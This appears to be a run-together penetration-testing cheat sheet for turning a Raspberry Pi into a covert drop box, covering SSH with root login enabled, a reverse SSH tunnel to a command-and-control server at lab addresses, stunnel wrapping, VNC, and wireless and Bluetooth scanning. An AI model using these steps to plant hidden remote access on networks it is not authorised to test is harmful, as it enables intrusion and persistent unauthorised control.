************************************************************************ Change Hostname***********************************************************************nano /etc/hostname************************************************************************ Change Host Mappings***********************************************************************nano /etc/hosts************************************************************************ Setting up SSH************************************************************************ Step 1: Verify SSH installedservice —status-all* Step 2: Install SSHapt-get install openssh-server* Reset run-level commands and ensure startup with OSupdate-rc.d -f ssh removeupdate-rc-d -f ssh defaults************************************************************************ Resetting SSH Default Keys************************************************************************ Step 1: Archive factory installed/default keyscd /etc/sshmkdir backup_keysmv ssh_host_* backup_keys* Step 2: Generate New SSH Keysdpkg-reconfigure openssh-server* Step 3: Edit (if necessary) root loginnano /etc/sshd_config* change “PermitRootLogin without-password” to “PermitRootLogin yes”* Step 4: Restart and configure run-levelsservice ssh restartupdate-rc.d -f ssh enable 2 3 4 5************************************************************************ Reverse Shell************************************************************************* Syntax for Remote side (Raspberry Pi) **ssh -fN -R 7000:localhost:22 username@ip-address-of-ourcommand-and-control-server* Example from lab on port 7000ssh -fN -R 7000:localhost:22 mike@10.5.8.57* Example from lab on port 8443ssh -fN -R 8443:localhost:22 mike@10.5.8.69** To connect to reverse SSH on C&C Serverssh root@localhost -p 8443************************************************************************ Stunnel Server-side Setup (Raspberry Pi side)************************************************************************ Step 1: Install Stunnelapt-get install stunnel4 -y* Step 2: Create Stunnel Keys cd /etc/stunnel/openssl genrsa -out key.pem 2048openssl req -new -x509 -key key.pem -out cert.pem -days 1095* After certificate form filled out and generated, enter the following:cat key.pem cert.pem >> /etc/stunnel/stunnel.pemsudo bashchmod 400 /etc/stunnel/stunnel.pem* Step 3: Edit Stunnel startup scripts to enablenano /etc/default/stunnel4* change “ENABLED=0” to “ENABLED=1”* Step 4: Edit Stunnel Config Filenano /etc/stunnel/stunnel.conf* File should look like this, with accept IP changed to Pi’s IP in your environment[squid]client = nocert = /etc/stunnel/stunnel.pemaccept = 10.5.8.74:8888connect = 127.0.0.1:22* Step 5: Configure IPtables if needednano /usr/local/bin/Firewall.sh* Add this line to Firewall.shiptables -A INPUT -p tcp -dport 8888 -j ACCEPT* Step 6: Restart Stunnel/etc/init.d/stunnel4 restart* Step 7: Install Squid (used in this example)apt-get install squid3 -yservice squid start************************************************************************ Stunnel Client-side Setup (C&C side)************************************************************************ Step 2: Modify Stunnel.conf file to include[squid]cert = stunnel.pemclient = yesaccept = 127.0.0.1:8080connect = [Server's Public IP]:8888* Step 3: Startup Stunnelstunnel************************************************************************ X-Windows through CLI on Mac OS X or Linux***********************************************************************ssh -X <username>@<remote IP or FQDN>************************************************************************ VNC Server install************************************************************************ Step 1: Install VNCapt-get install tightvncserver* Step 2: Startup VNC Servervncserver :1* Step 3: Verify operationnetstat -tupln************************************************************************ Wireless Operation************************************************************************ See Wireless Interfacesiwconfig* Configure Wireless Interface IPv4 Settings (wlanX interfaces, where x is the * interface number)nano /etc/network/interfaces* Activate Wireless Interfaceifconfig wlan0 up* Scan for stations that can be heard on wlan0 interfaceiwlist wlan0 scanning************************************************************************ Bluetooth Operation************************************************************************ Step 1: install Kali Wireless Metapackageapt-get install kali-linux-wireless* Step 3: Identify adapters attached via USBlsusb* Step 4: Restart Bluetooth/etc/init.d/Bluetooth start* OR/etc/init.d/Bluetooth restart* Step 5: Scan to see if runninghcitool dev* Step 6: Start up and enable config mode, and proceed to scanhciconfig hci0 upbluetoothctl -ascan onscan off* Step 7: See list of discovered devicesdevices* Step 8: Get info on specific deviceinfo <MAC address of device>* Step 9: Pair with devicepair <MAC address of device>